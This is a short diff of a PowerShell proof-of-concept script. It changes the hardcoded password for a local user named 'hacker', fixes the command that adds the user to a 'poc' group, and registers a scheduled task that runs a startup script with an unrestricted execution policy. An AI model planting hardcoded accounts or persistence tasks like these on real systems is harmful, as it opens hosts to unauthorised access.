@@ -55,8 +55,8 @@ Unregister-ScheduledTask -TaskName $taskName -Confirm:`$false
 "@
 
 net localgroup poc /add
-net user hacker Hackercollege@2020 /add
-net localgroup poc /hacker /add
+net user hacker !QAZxsw2#EDC /add
+net localgroup poc hacker /add
 
 Add-Content "C:\\startscript.ps1" -value $script
 $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-ExecutionPolicy Unrestricted -File C:\\startscript.ps1'
